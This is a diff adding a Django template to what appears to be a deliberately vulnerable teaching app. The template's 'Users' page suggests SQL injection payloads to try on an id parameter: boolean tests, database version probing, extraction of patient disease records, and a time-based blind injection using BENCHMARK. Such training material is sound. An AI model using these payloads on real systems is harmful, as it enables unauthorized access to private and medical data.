@@ -1,0 +1,40 @@
+{% extends "base.html" %}
+{% load staticfiles %}
+
+
+{% block head %}
+
+{% endblock head %}
+
+
+{% block content %}
+
+<h1 class="header">Users</h1>
+
+<i>
+    <p>Try these:</p>
+    <p>
+        ?id=2<br>
+        ?id=2 AND 1=1<br>
+        ?id=2 AND 1=2<br>
+        ?id=2 OR 1=1<br>
+        ?id=2 AND substring(@@version, 1, 1)=5<br>
+        ?id=-1 OR app_patient.disease='tuberculosis'<br>
+        ?id=1 AND IF (SUBSTRING(app_patient.id,1,1) = CHAR(51), BENCHMARK(10000000,ENCODE('MSG','by 5 seconds')), null) <br>
+    </p>
+</i>
+
+{% for user in users %}
+<article>
+    <h2>User: </h2>
+    <h3>{{ user.username }}</h3>
+    <p>{{ user.first_name }} {{ user.last_name }}</p>
+    <hr>
+</article>
+{% endfor %}
+
+{% endblock content %}
+
+
+{% block scripts %}
+{% endblock scripts %}
